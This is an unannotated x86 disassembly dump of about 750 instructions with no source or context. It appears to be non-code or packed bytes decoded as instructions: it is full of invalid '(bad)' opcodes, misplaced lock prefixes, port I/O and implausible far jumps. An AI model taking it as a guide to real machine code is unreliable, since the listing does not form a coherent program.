  423dfb:	mov    dl,0x50
  423dfd:	ja     0x423dae
  423dff:	xor    BYTE PTR [edi+0x7a],0x80
  423e03:	lock jp 0x423e59
  423e06:	cld    
  423e07:	push   ebx
  423e08:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e0e:	or     al,0xff
  423e10:	mov    dl,0x80
  423e12:	lock scas eax,DWORD PTR es:[edi]
  423e14:	or     DWORD PTR [edx],esp
  423e16:	mov    dl,0x50
  423e18:	ja     0x423dc9
  423e1a:	xor    BYTE PTR [edi+0x56],0x80
  423e1e:	lock push esi
  423e20:	push   ebx
  423e21:	cld    
  423e22:	push   ebx
  423e23:	adc    DWORD PTR [edx-0x7b4df342],esi
  423e29:	sub    edi,edi
  423e2b:	mov    dl,0x80
  423e2d:	lock scas eax,DWORD PTR es:[edi]
  423e2f:	arpl   bp,di
  423e31:	or     DWORD PTR [edi],ecx
  423e33:	(bad)  
  423e34:	or     al,0x8d
  423e36:	lea    eax,[eax+0x7750af77]
  423e3c:	scas   eax,DWORD PTR es:[edi]
  423e3d:	xor    BYTE PTR [edi+0x46],0xec
  423e41:	ja     0x423ea5
  423e43:	push   eax
  423e44:	out    0x3e,eax
  423e46:	push   eax
  423e47:	ja     0x423ea7
  423e49:	pop    esi
  423e4a:	cmc    
  423e4b:	and    al,0x6f
  423e4d:	cmp    BYTE PTR [eax+0x77],dl
  423e50:	push   0x7c
  423e52:	ja     0x423eba
  423e54:	hlt    
  423e55:	and    al,0x6f
  423e57:	cmp    BYTE PTR [edi+esi*2+0x26],bh
  423e5b:	repz and al,0x6f
  423e5e:	cmp    BYTE PTR [eax+0x77],dl
  423e61:	test   DWORD PTR [eax-0xf7fc189],0x53fc533e
  423e6b:	adc    DWORD PTR [edx-0x414dd67c],esi
  423e71:	or     al,0xff
  423e73:	mov    dl,0x50
  423e75:	ja     0x423e74
  423e77:	sub    BYTE PTR [edx-0x42],0x4f
  423e7b:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423e81:	dec    edi
  423e82:	xor    DWORD PTR [ebp+0x4d],ecx
  423e85:	dec    ebp
  423e86:	jmp    0x7c6a:0x80386f24
  423e8d:	dec    edi
  423e8e:	jge    0x423edd
  423e90:	dec    ebp
  423e91:	dec    ebp
  423e92:	or     esp,DWORD PTR [edi+ebp*2]
  423e95:	cmp    BYTE PTR [eax-0x7f957f96],al
  423e9b:	ja     0x423e94
  423e9d:	xor    al,0xf7
  423ea0:	push   ebx
  423ea1:	cld    
  423ea2:	push   ebx
  423ea3:	adc    DWORD PTR [edx-0x414dd67c],esi
  423ea9:	or     al,0xff
  423eab:	mov    dl,0x80
  423ead:	lock std 
  423eaf:	or     DWORD PTR [edx],esp
  423eb1:	mov    dl,0x80
  423eb3:	lock pop esi
  423eb5:	(bad)  
  423eb6:	out    dx,al
  423eb7:	out    dx,eax
  423eb8:	adc    BYTE PTR [edi-0x54],dh
  423ebb:	sub    BYTE PTR [edx-0x80],0x77
  423ebf:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423ec9:	or     al,0xb2
  423ecb:	test   BYTE PTR [ecx],ch
  423ecd:	push   DWORD PTR [edx+0x9fdf080]
  423ed3:	and    dh,BYTE PTR [edx-0x7f990f80]
  423ed9:	xchg   edi,eax
  423eda:	push   bx
  423edc:	push   ecx
  423edd:	push   ebx
  423ede:	xchg   esp,eax
  423edf:	mov    dl,0xba
  423ee1:	sub    DWORD PTR [edx-0x100f3f9],esi
  423ee7:	in     al,dx
  423ee8:	mov    dl,0x80
  423eea:	lock pop esi
  423eec:	or     eax,esp
  423eee:	and    edi,ebp
  423ef0:	or     BYTE PTR [edi+0x31],0x4d
  423ef4:	dec    ebp
  423ef5:	dec    ebp
  423ef6:	sbb    BYTE PTR [eax],0x31
  423ef9:	dec    ebp
  423efa:	dec    ebp
  423efb:	dec    ebp
  423efc:	push   ebx
  423efd:	cld    
  423efe:	push   ebx
  423eff:	xchg   esp,eax
  423f00:	mov    dl,0x84
  423f02:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f08:	in     al,dx
  423f09:	mov    dl,0x9
  423f0b:	loopne 0x423efd
  423f0d:	lods   al,BYTE PTR ds:[esi]
  423f0e:	push   ebx
  423f0f:	std    
  423f10:	adc    al,dh
  423f12:	lods   al,BYTE PTR ds:[esi]
  423f13:	sub    BYTE PTR [edx-0x71],0x77
  423f17:	lods   al,BYTE PTR ds:[esi]
  423f18:	xor    al,0xf7
  423f1b:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f22:	mov    dl,0x7
  423f24:	or     al,0xb2
  423f26:	mov    edx,0x80feff29
  423f2b:	xchg   edi,eax
  423f2c:	std    
  423f2d:	or     DWORD PTR [edx],esp
  423f2f:	inc    BYTE PTR [eax-0x11efa169]
  423f35:	push   cs
  423f36:	sub    BYTE PTR [edx-0x80],0x77
  423f3a:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423f44:	sub    DWORD PTR [edx-0x4d00f342],esi
  423f4a:	xor    al,0xfd
  423f4d:	or     DWORD PTR [edx],esp
  423f4f:	mov    dl,0x80
  423f51:	lock pop esi
  423f53:	(bad)  
  423f54:	out    dx,al
  423f55:	out    dx,eax
  423f56:	adc    BYTE PTR [edi-0x54],dh
  423f59:	sub    BYTE PTR [edx-0x80],0x77
  423f5d:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423f67:	adc    DWORD PTR [edx-0x4d00f342],esi
  423f6d:	xor    al,0xfd
  423f70:	or     DWORD PTR [edx],esp
  423f72:	mov    dl,0x80
  423f74:	lock push 0xffffff80
  423f77:	xchg   edi,eax
  423f78:	push   0x53
  423f7a:	push   ecx
  423f7b:	push   ebx
  423f7c:	xchg   esp,eax
  423f7d:	mov    dl,0xba
  423f7f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f85:	in     al,dx
  423f86:	mov    dl,0x80
  423f88:	lock pop esi
  423f8a:	or     eax,esp
  423f8c:	and    edi,ebp
  423f8e:	or     BYTE PTR [edi+0x7d],0x4d
  423f92:	dec    ebp
  423f93:	dec    ebp
  423f94:	sbb    BYTE PTR [eax],0x7d
  423f97:	dec    ebp
  423f98:	dec    ebp
  423f99:	dec    ebp
  423f9a:	push   ebx
  423f9b:	cld    
  423f9c:	push   ebx
  423f9d:	xchg   esp,eax
  423f9e:	mov    dl,0x84
  423fa0:	sub    DWORD PTR [edx-0x400f3f9],esi
  423fa6:	in     al,dx
  423fa7:	mov    dl,0x9
  423fa9:	loopne 0x423f9b
  423fab:	lods   al,BYTE PTR ds:[esi]
  423fac:	push   ebx
  423fad:	std    
  423fae:	adc    al,dh
  423fb0:	lods   al,BYTE PTR ds:[esi]
  423fb1:	sub    BYTE PTR [edx-0x71],0x77
  423fb5:	lods   al,BYTE PTR ds:[esi]
  423fb6:	xor    al,0xf7
  423fb9:	adc    BYTE PTR [edi+0x535153f7],0x94
  423fc0:	mov    dl,0x7
  423fc2:	or     al,0xb2
  423fc4:	mov    edx,0x80feff29
  423fc9:	xchg   edi,eax
  423fca:	std    
  423fcb:	or     DWORD PTR [edx],esp
  423fcd:	inc    BYTE PTR [eax-0x11efa169]
  423fd3:	push   cs
  423fd4:	sub    BYTE PTR [edx-0x80],0x77
  423fd8:	es xor al,0x26
  423fdc:	push   ebx
  423fdd:	adc    DWORD PTR [ebx-0x4],edx
  423fe0:	mov    dl,0xbe
  423fe2:	or     al,0xb2
  423fe4:	test   BYTE PTR [ecx],ch
  423fe6:	push   DWORD PTR [edx-0x7f950f80]
  423fec:	xchg   edi,eax
  423fed:	push   0x53
  423fef:	push   ecx
  423ff0:	push   ebx
  423ff1:	xchg   esp,eax
  423ff2:	mov    dl,0xba
  423ff4:	sub    DWORD PTR [edx-0x100f3f9],esi
  423ffa:	or     DWORD PTR [edx],esp
  423ffc:	mov    dl,0xec
  423ffe:	ja     0x423ffd
  424000:	push   eax
  424001:	ja     0x424000
  424003:	xor    BYTE PTR [edi-0x3],0x80
  424007:	lock scas eax,DWORD PTR es:[edi]
  424009:	arpl   bp,di
  42400b:	or     edx,ebp
  42400d:	(bad)  
  42400e:	or     eax,0x77804d4d
  424013:	push   0xffffff80
  424015:	lock push 0x53
  424018:	adc    DWORD PTR [edx-0x3acf342],esi
  42401e:	mov    dl,0x84
  424020:	sub    edi,edi
  424022:	mov    dl,0x80
  424024:	lock scas eax,DWORD PTR es:[edi]
  424026:	or     DWORD PTR [edx],esp
  424028:	mov    dl,0x80
  42402a:	lock ds push ebx
  42402d:	push   ecx
  42402e:	mov    dl,0xba
  424030:	sub    edi,edi
  424032:	mov    dl,0x80
  424034:	lock ds push ebx
  424037:	adc    DWORD PTR [edx-0x4d00f342],esi
  42403d:	push   eax
  42403e:	ja     0x4240a6
  424040:	xor    BYTE PTR [edi-0x7e],0x80
  424044:	lock adc BYTE PTR [ebx+0x11],0xb2
  424049:	mov    esi,0xb2fc530c
  42404e:	test   BYTE PTR [ecx],ch
  424050:	push   DWORD PTR [edx-0x7f7d0f80]
  424056:	xchg   edi,eax
  424057:	adc    BYTE PTR [ebx+0x51],0xb2
  42405b:	mov    edx,0xb2945329
  424060:	pop    es
  424061:	or     al,0xff
  424063:	(bad)  
  424064:	in     al,dx
  424065:	lock data16 in al,dx
  424068:	std    
  424069:	in     al,dx
  42406a:	lock inc esi
  42406c:	push   eax
  42406d:	lock inc esi
  42406f:	les    ebx,FWORD PTR ds:0x80827780
  424075:	lock adc BYTE PTR [ebx-0x4],0x53
  42407a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424080:	or     al,0xff
  424082:	mov    dl,0xec
  424084:	ja     0x4240cc
  424086:	push   eax
  424087:	ja     0x4240cf
  424089:	xor    BYTE PTR [edi-0x7e],0x80
  42408d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424092:	test   BYTE PTR [ecx],ch
  424094:	push   ebx
  424095:	adc    DWORD PTR [edx-0x4d00f342],esi
  42409b:	xor    al,0x1e
  42409e:	inc    ebx
  42409f:	std    
  4240a0:	xor    BYTE PTR [edi-0x7e],0x80
  4240a4:	xchg   edi,eax
  4240a5:	adc    BYTE PTR [ebx-0x4],0x53
  4240a9:	xchg   esp,eax
  4240aa:	mov    dl,0x7
  4240ac:	or     al,0xb2
  4240ae:	test   BYTE PTR [ecx],ch
  4240b0:	(bad)  
  4240b1:	sti    
  4240b2:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  4240b9:	mov    dl,0x9
  4240bb:	dec    esp
  4240bc:	xor    cl,BYTE PTR [edx+0x77804d4d]
  4240c2:	out    dx,eax
  4240c3:	dec    ebp
  4240c4:	xlat   BYTE PTR ds:[ebx]
  4240c5:	and    DWORD PTR [ecx],eax
  4240c7:	ja     0x42404f
  4240c9:	dec    ebp
  4240ca:	xlat   BYTE PTR ds:[ebx]
  4240cb:	out    dx,eax
  4240cc:	or     al,BYTE PTR [eax-0x327f1089]
  4240d2:	jp     0x42410e
  4240d4:	lea    ecx,[ebp+0x7780814d]
  4240da:	out    dx,eax
  4240db:	or     ch,0xf7
  4240de:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4240e4:	xlat   BYTE PTR ds:[ebx]
  4240e5:	mov    cl,BYTE PTR [ebp-0x29]
  4240e8:	jbe    0x424070
  4240ea:	test   eax,0x508d8def
  4240ef:	ja     0x424153
  4240f1:	xor    BYTE PTR [edi-0x75],0x80
  4240f5:	lock mov edx,DWORD PTR [ebx+0x74]
  4240f9:	push   ebx
  4240fa:	push   ecx
  4240fb:	mov    dl,0xba
  4240fd:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424103:	xor    al,0x76
  424106:	arpl   WORD PTR [edx+0x778057d5],si
  42410c:	out    dx,eax
  42410d:	xor    al,0x2e
  424110:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  424117:	lea    ecx,[ebp+0x7e531153]
  42411d:	mov    dl,0xbe
  42411f:	or     al,0xb2
  424121:	clc    
  424122:	sub    edi,edi
  424124:	(bad)  
  424125:	xchg   esi,eax
  424126:	xor    al,0x8b
  424129:	adc    BYTE PTR [edi+0x5311538b],0x7e
  424130:	mov    dl,0xbe
  424132:	or     al,0xb2
  424134:	clc    
  424135:	sub    edi,edi
  424137:	(bad)  
  424138:	xchg   esi,eax
  424139:	dec    ebp
  42413a:	xlat   BYTE PTR ds:[ebx]
  42413b:	jbe    0x42418a
  42413d:	or     bl,BYTE PTR ds:0x70a3a9ab
  424143:	sti    
  424144:	out    dx,eax
  424145:	lea    edx,[edi-0x78127880]
  42414b:	and    eax,0x80328099
  424150:	mov    ds:0x8d8d3a2e,al
  424155:	in     eax,dx
  424156:	pop    ebp
  424157:	lea    ecx,[ecx]
  424159:	(bad)  
  42415b:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  424161:	(bad)  
  424163:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  424169:	jne    0x80cfcefc
  42416f:	dec    esp
  424170:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424176:	or     DWORD PTR [edi],ecx
  424178:	mov    esp,0xed8d8d8d
  42417d:	cli    
  42417e:	inc    ecx
  42417f:	lea    ecx,[ebp+0xf09718d]
  424185:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42418b:	push   ebp
  42418c:	or     DWORD PTR [edi],ecx
  42418e:	mov    dh,0x8d
  424190:	lea    ecx,[ebp+0x3a268e80]
  424196:	lea    ecx,[ebp-0x72cd4813]
  42419c:	cmp    dh,0x43
  42419f:	mov    eax,ds:0x5c09fbec
  4241a4:	or     ah,BYTE PTR [ecx]
  4241a6:	push   eax
  4241a7:	lock stc 
  4241a9:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  4241ad:	in     al,dx
  4241ae:	dec    BYTE PTR [ecx]
  4241b0:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  4241b7:	adc    eax,0x86f05093
  4241bc:	cli    
  4241bd:	dec    ebp
  4241be:	dec    ebp
  4241bf:	dec    ebp
  4241c0:	jmp    0x42415d
  4241c2:	dec    edi
  4241c3:	outs   dx,BYTE PTR ds:[esi]
  4241c4:	aad    0xeb
  4241c6:	or     BYTE PTR [esi],0xed
  4241c9:	mov    bh,0xc8
  4241cb:	lea    esi,[ebx]
  4241cd:	jle    0x4241bb
  4241cf:	test   DWORD PTR [ecx],0x9a1e65c
  4241d5:	pop    esp
  4241d6:	scas   al,BYTE PTR es:[edi]
  4241d7:	and    esp,ebp
  4241d9:	push   es
  4241da:	aad    0xbf
  4241dc:	add    edx,ebx
  4241de:	adc    eax,0x4f87f050
  4241e3:	outs   dx,BYTE PTR ds:[esi]
  4241e4:	aad    0x92
  4241e6:	xor    BYTE PTR [eax],0xed
  4241e9:	mov    bh,0x8b
  4241eb:	lea    esi,[ebx]
  4241ed:	push   ecx
  4241ee:	in     al,dx
  4241ef:	std    
  4241f0:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  4241f4:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  4241f8:	in     al,dx
  4241f9:	push   es
  4241fa:	aad    0x43
  4241fc:	add    edi,ebx
  4241fe:	adc    eax,0x808ae750
  424203:	out    0x8a,eax
  424205:	sub    BYTE PTR [ebx+0x4f],0x4d
  424209:	aad    0x6f
  42420b:	and    BYTE PTR [edi-0x73dac507],0x9
  424212:	pop    esp
  424213:	fbld   TBYTE PTR [ecx+0x219f5c09]
  424219:	dec    ebp
  42421a:	ja     0x4241a7
  42421c:	in     eax,dx
  42421d:	ja     0x4241a9
  42421f:	out    dx,eax
  424220:	in     al,dx
  424221:	push   es
  424222:	pop    edi
  424223:	out    0x8b,eax
  424225:	in     al,0xa4
  424227:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  42422b:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  42422f:	xor    al,0x87
  424232:	dec    ebp
  424233:	ja     0x4241fd
  424235:	in     eax,dx
  424236:	mov    dl,0xef
  424238:	in     al,dx
  424239:	push   es
  42423a:	push   eax
  42423b:	lock xchg DWORD PTR [edi-0x19],ebx
  42423f:	enter  0x2ee4,0x80
  424243:	lock xchg BYTE PTR [ecx],cl
  424246:	pop    esp
  424247:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  42424d:	dec    ebp
  42424e:	ja     0x424282
  424250:	in     eax,dx
  424251:	mov    dl,0xef
  424253:	in     al,dx
  424254:	pushf  
  424255:	push   eax
  424256:	lock xchg BYTE PTR [edi-0x69],bl
  42425a:	xor    cl,BYTE PTR [ecx]
  42425c:	jmp    0xa3ab:0x4d4d4d9a
  424263:	push   ebx
  424264:	push   0x6d
  424266:	les    ecx,FWORD PTR [ebx+edx*2]
  424269:	push   0xffffffa9
  42426b:	jo     0x4242e1
  42426d:	xchg   edi,eax
  42426e:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424275:	lea    eax,[eax-0x7812de89]
  42427b:	jno    0x424210
  42427d:	push   ebx
  42427e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42427f:	cdq    
  424280:	fwait
  424281:	pop    edi
  424282:	pop    ds
  424283:	or     DWORD PTR [edi],ecx
  424285:	jmp    0xd574:0x638d8d8d
  42428c:	call   0xd81fdff0
  424291:	das    
  424292:	push   ebx
  424293:	push   0x6d
  424295:	(bad)  
  424296:	fld    DWORD PTR [eax+0x77ecdd6d]
  42429c:	out    dx,eax
  42429d:	cmp    BYTE PTR [ebp+0x25],0x80
  4242a1:	or     dh,BYTE PTR ds:0x80155280
  4242a7:	fstp   QWORD PTR ds:0xeceff0ec
  4242ad:	xchg   edi,eax
  4242ae:	out    dx,eax
  4242af:	push   eax
  4242b0:	xlat   BYTE PTR ds:[ebx]
  4242b1:	mov    ah,BYTE PTR [ebx+0x4b]
  4242b4:	fucomi st,st(4)
  4242b6:	push   eax
  4242b7:	out    0x8a,eax
  4242b9:	push   eax
  4242ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242bb:	mov    ebx,DWORD PTR [edi-0x59]
  4242be:	mov    bl,cl
  4242c0:	mov    dh,0x63
  4242c2:	popf   
  4242c3:	adc    eax,0x5c096fd3
  4242c8:	push   ebp
  4242c9:	scas   al,BYTE PTR es:[edi]
  4242ca:	les    ecx,FWORD PTR [eax+eax*4]
  4242cd:	mov    BYTE PTR [ecx],0x55
  4242d0:	mov    es,WORD PTR [eax-0x2ab2b097]
  4242d6:	aas    
  4242d7:	in     al,dx
  4242d8:	out    0xef,eax
  4242da:	push   eax
  4242db:	out    0x32,eax
  4242dd:	arpl   WORD PTR [ebx-0x587f8e27],cx
  4242e3:	and    DWORD PTR [eax-0x7d131a5d],eax
  4242e9:	arpl   WORD PTR [esi],ax
  4242eb:	shr    esi,cl
  4242ed:	sbb    BYTE PTR [ecx-0x3c],0xef
  4242f1:	inc    ebx
  4242f2:	out    0xef,eax
  4242f4:	push   eax
  4242f5:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  4242ff:	mov    esi,DWORD PTR [ebx+0x50]
  424302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424303:	mov    esp,DWORD PTR [ebx-0x59]
  424306:	mov    ah,ah
  424308:	pop    esi
  424309:	(bad)  
  42430a:	into   
  42430b:	push   ebx
  42430c:	push   0xffffffab
  42430e:	test   eax,0xeffb70a3
  424313:	lea    edx,[edi-0x78127880]
  424319:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  424323:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  424327:	cmc    
  424328:	and    al,0x6f
  42432a:	cmp    BYTE PTR [eax-0x587f7510],al
  424330:	mov    bl,BYTE PTR [ebx+0x52010de2]
  424336:	cmp    dl,BYTE PTR [ebx+0x51]
  424339:	mov    dl,0xbe
  42433b:	or     al,0xab
  42433d:	push   ebx
  42433e:	lods   al,BYTE PTR ds:[esi]
  42433f:	mov    dl,0xb4
  424341:	sub    edi,edi
  424343:	adc    DWORD PTR [eax-0x10],edx
  424346:	xchg   BYTE PTR [eax-0xf7f7510],al
  42434c:	mov    al,BYTE PTR [eax-0xf7f7510]
  424352:	mov    al,BYTE PTR [eax-0xf7f7510]
  424358:	mov    al,BYTE PTR [eax-0xf7f7510]
  42435e:	mov    al,BYTE PTR [eax-0xf7f7510]
  424364:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  424368:	fsincos 
  42436a:	lods   al,BYTE PTR ds:[esi]
  42436b:	pop    eax
  42436c:	xor    al,0x8a
  42436f:	and    BYTE PTR [edi+0x53ac538a],0x51
  424376:	mov    dl,0xb4
  424378:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42437e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424385:	lea    ecx,[ebp+0xf09ff63]
  42438b:	sbb    ah,ch
  42438d:	lea    ecx,[ebp-0x7f750f80]
  424393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424394:	mov    dl,BYTE PTR [ebx+0x51]
  424397:	push   ebx
  424398:	lods   al,BYTE PTR ds:[esi]
  424399:	mov    dl,0xbe
  42439b:	or     al,0xb2
  42439d:	mov    ah,0x29
  42439f:	call   DWORD PTR [ecx]
  4243a1:	arpl   si,di
  4243a3:	or     DWORD PTR [edi],ecx
  4243a5:	jecxz  0x424393
  4243a7:	lea    ecx,[ebp-0x72327080]
  4243ad:	lea    ecx,[ebp-0x7f756880]
  4243b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243b4:	mov    dl,BYTE PTR [ebx+0x7e]
  4243b7:	push   ebx
  4243b8:	lods   al,BYTE PTR ds:[esi]
  4243b9:	mov    dl,0x7
  4243bb:	or     al,0xb2
  4243bd:	mov    ah,0x29
  4243bf:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  4243c6:	in     al,dx
  4243c7:	lea    ecx,[ebp+0x50eff0ec]
  4243cd:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  4243d8:	pop    es
  4243d9:	or     al,0xb2
  4243db:	mov    ah,0x29
  4243dd:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  4243e4:	xor    ah,BYTE PTR [ebx-0x9]
  4243e7:	aad    0x27
  4243e9:	xor    BYTE PTR [edi-0x76],0x80
  4243ed:	xchg   edi,eax
  4243ee:	mov    dl,BYTE PTR [ebx-0x64]
  4243f1:	push   ebx
  4243f2:	cld    
  4243f3:	mov    dl,0xf8
  4243f5:	sub    DWORD PTR [edx-0x400f37a],esi
  4243fb:	adc    BYTE PTR [edi+0x1572c332],0x5f
  424402:	out    dx,al
  424403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424404:	xlat   BYTE PTR ds:[ebx]
  424405:	rol    BYTE PTR [eax-0x687f7589],0x8a
  42440c:	push   ebx
  42440d:	pushf  
  42440e:	push   ebx
  42440f:	cld    
  424410:	mov    dl,0xf8
  424412:	sub    DWORD PTR [edx-0x400f37a],esi
  424418:	adc    BYTE PTR [edi+0x1572c332],0x5f
  42441f:	jne    0x4243c7
  424421:	jno    0x42442c
  424423:	push   gs
  424425:	or     al,0x8d
  424427:	lea    eax,[eax+0x77808a77]
  42442d:	mov    al,BYTE PTR [eax+0x77808aa7]
  424433:	mov    dl,BYTE PTR [ebx+0x7c]
  424436:	push   ebx
  424437:	add    al,0xb2
  424439:	test   BYTE PTR [ecx],ch
  42443b:	mov    dl,0xc4
  42443d:	or     al,0xff
  42443f:	add    BYTE PTR [eax+0x6ac33277],0x15
  424446:	in     al,dx
  424447:	mov    dl,0x80
  424449:	jge    0x4244bc
  42444b:	in     al,dx
  42444c:	lock out dx,eax
  42444e:	push   eax
  42444f:	lock test BYTE PTR [eax-0x687f7510],al
  424456:	mov    dl,BYTE PTR [ebx+0x51]
  424459:	push   ebx
  42445a:	pushf  
  42445b:	mov    dl,0xbe
  42445d:	or     al,0xb2
  42445f:	clc    
  424460:	sub    edi,edi
  424462:	inc    BYTE PTR [eax-0xfaf7569]
  424468:	jp     0x4243ea
  42446a:	out    dx,eax
  42446b:	push   eax
  42446c:	lock stc 
  42446e:	xor    al,0x8a
  424471:	push   ebx
  424472:	jle    0x4244c7
  424474:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42447a:	or     al,0xff
  42447c:	mov    dh,0x80
  42447e:	lock stc 
  424480:	arpl   si,di
  424482:	aad    0x6f
  424484:	in     al,dx
  424485:	lock out dx,eax
  424487:	push   eax
  424488:	lock jp 0x42440b
  42448b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424492:	push   ebx
  424493:	pushf  
  424494:	mov    dl,0xbe
  424496:	or     al,0xb2
  424498:	clc    
  424499:	sub    edi,edi
  42449b:	(bad)  
  42449c:	in     al,dx
  42449d:	jge    0x4244c0
  42449f:	jl     0x424518
  4244a1:	xor    cl,0x24
  4244a4:	outs   dx,DWORD PTR ds:[esi]
  4244a5:	cmp    ah,ch
  4244a7:	lock out dx,eax
  4244a9:	push   eax
  4244aa:	lock xchg esp,eax
  4244ad:	in     al,dx
  4244ae:	xor    al,0x87
  4244b1:	xor    BYTE PTR [edi+0x21],0x80
  4244b5:	int    0x32
  4244b7:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  4244bd:	xor    BYTE PTR [edi+0x21],0x4d
  4244c1:	xlat   BYTE PTR ds:[ebx]
  4244c2:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  4244c8:	lea    ecx,[ebp+0xa]
  4244cb:	and    DWORD PTR [edi+esi*2-0x7d],edi
  4244cf:	add    dl,ch
  4244d1:	cs jne 0x424550
  4244d4:	ja     0x424459
  4244d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244d7:	push   ss
  4244d8:	outs   dx,DWORD PTR ds:[esi]
  4244d9:	cmp    BYTE PTR [eax-0x687f7510],al
  4244df:	mov    dl,BYTE PTR [ebx+0x51]
  4244e2:	push   ebx
  4244e3:	pushf  
  4244e4:	mov    dl,0xbe
  4244e6:	or     al,0xb2
  4244e8:	clc    
  4244e9:	sub    edi,edi
  4244eb:	(bad)  
  4244ec:	push   eax
  4244ed:	ja     0x4244e8
  4244ef:	arpl   bp,di
  4244f1:	xlat   BYTE PTR ds:[ebx]
  4244f2:	pop    ecx
  4244f3:	xor    BYTE PTR [edi-0x75],0x80
  4244f7:	lock mov edx,DWORD PTR [ebx-0x4]
  4244fb:	push   ebx
  4244fc:	sub    dh,BYTE PTR [edx-0x794dd646]
  424502:	or     al,0xff
  424504:	mov    dl,0x80
  424506:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  42450e:	push   ecx
  42450f:	mov    dl,0xf8
  424511:	sub    esp,ebp
  424513:	add    BYTE PTR [eax-0x327fde89],0x32
  42451a:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  424520:	push   DWORD PTR [esi-0x556bddf7]
  424526:	dec    ebp
  424527:	or     dh,BYTE PTR ds:0x808a7780
  42452d:	lock mov dl,BYTE PTR [ebx-0x4]
  424531:	push   ebx
  424532:	sub    dh,BYTE PTR [edx-0x454df37a]
  424538:	sub    edi,edi
  42453a:	mov    dl,0x63
  42453c:	ja     0x424537
  42453e:	xlat   BYTE PTR ds:[ebx]
  42453f:	mov    al,0x80
  424541:	ja     0x4244c5
  424543:	xor    al,0x82
  424546:	push   ebx
  424547:	sub    dl,BYTE PTR [ebx-0x4]
  42454a:	mov    dl,0x86
  42454c:	or     al,0xb2
  42454e:	mov    edx,0x63fdff29
  424553:	mov    al,ds:0x4d954c09
  424558:	dec    ebp
  424559:	dec    ebp
  42455a:	xor    BYTE PTR [edi-0x76],0x80
  42455e:	lock mov dl,BYTE PTR [ebx-0x4]
  424562:	push   ebx
  424563:	sub    dh,BYTE PTR [edx-0x454df37a]
  424569:	sub    edi,edi
  42456b:	mov    dl,0x63
  42456d:	ja     0x424568
  42456f:	xlat   BYTE PTR ds:[ebx]
  424570:	mov    al,0x80
  424572:	ja     0x4244ff
  424574:	xor    al,0x8b
  424577:	push   ebx
  424578:	cld    
  424579:	push   ebx
  42457a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424580:	sub    edi,edi
  424582:	mov    dl,0x3a
  424584:	ja     0x42450c
  424586:	mov    esi,0x8d8d3aae
  42458b:	jl     0x424604
  42458d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424593:	ja     0x42455d
  424595:	fld    DWORD PTR [ebp-0x587f12e3]
  42459b:	mov    al,BYTE PTR [eax+0x4538a77]
  4245a1:	push   ebx
  4245a2:	jl     0x424556
  4245a4:	les    ecx,FWORD PTR [edx+esi*4]
  4245a7:	test   BYTE PTR [ecx],ch
  4245a9:	inc    DWORD PTR [edx-0x72c5e442]
  4245af:	lea    eax,[eax-0xf7f7589]
  4245b5:	mov    dl,BYTE PTR [ebx-0x4]
  4245b8:	push   ebx
  4245b9:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245bf:	sub    edi,edi
  4245c1:	mov    dl,0x50
  4245c3:	ja     0x42454c
  4245c5:	xor    BYTE PTR [edi-0x76],0x80
  4245c9:	lock mov dl,BYTE PTR [ebx-0x4]
  4245cd:	push   ebx
  4245ce:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245d4:	sub    edi,edi
  4245d6:	mov    dl,0x50
  4245d8:	ja     0x4245a2
  4245da:	xor    al,0x8a
  4245dd:	xor    BYTE PTR [edi-0x76],0x53
  4245e1:	push   ecx
  4245e2:	push   ebx
  4245e3:	jl     0x424597
  4245e5:	test   BYTE PTR [ecx],ch
  4245e7:	mov    dl,0xbe
  4245e9:	or     al,0xff
  4245eb:	std    
  4245ec:	xor    BYTE PTR [edi+0x7a],0x63
  4245f0:	std    
  4245f1:	aad    0x6f
  4245f3:	sub    dh,0x1e
  4245f6:	push   eax
  4245f7:	ja     0x424580
